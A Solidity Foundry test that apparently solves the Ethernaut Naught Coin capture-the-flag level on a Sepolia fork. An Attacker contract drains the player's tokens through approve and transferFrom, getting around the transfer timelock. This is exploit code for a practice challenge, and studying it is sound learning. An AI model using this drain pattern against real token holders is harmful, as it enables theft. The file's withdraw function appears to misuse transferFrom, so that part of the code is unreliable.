// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface NaughtCoin{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Attacker{
    address public owner;
    NaughtCoin public naughtCoin;
    constructor(address _owner, NaughtCoin _naughtCoin)  {
        owner = _owner;
        naughtCoin = _naughtCoin;
    }

    function attack() external {
        naughtCoin.transferFrom(owner, address(this), naughtCoin.balanceOf(owner));
    }

    function withdraw(address to) public {
        require(owner == msg.sender);
        naughtCoin.transferFrom(address(this), to, naughtCoin.balanceOf(address(this)));
    }
}

contract NaughtCoinTest is Test{
    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function test_naughtcoin_attack() public{
        NaughtCoin coin = NaughtCoin(0x1e784BCc37a8FCA92Dd19e2DdB1E1aCA90021aa6);
        address owner = 0x8AC4E3906688EfE71818531a9e439A7ABFDA0154;

        require(coin.balanceOf(owner) > 0, "NaughtCoinTest: balanceOf owner should be larger than 0 initially");

        Attacker attacker = new Attacker(owner , coin);

        vm.prank(owner);
        coin.approve(address(attacker), type(uint256).max);

        attacker.attack();

        require(coin.balanceOf(owner) == 0, "NaughtCoinTest: balanceOf owner should be 0 in the end");
    }
}
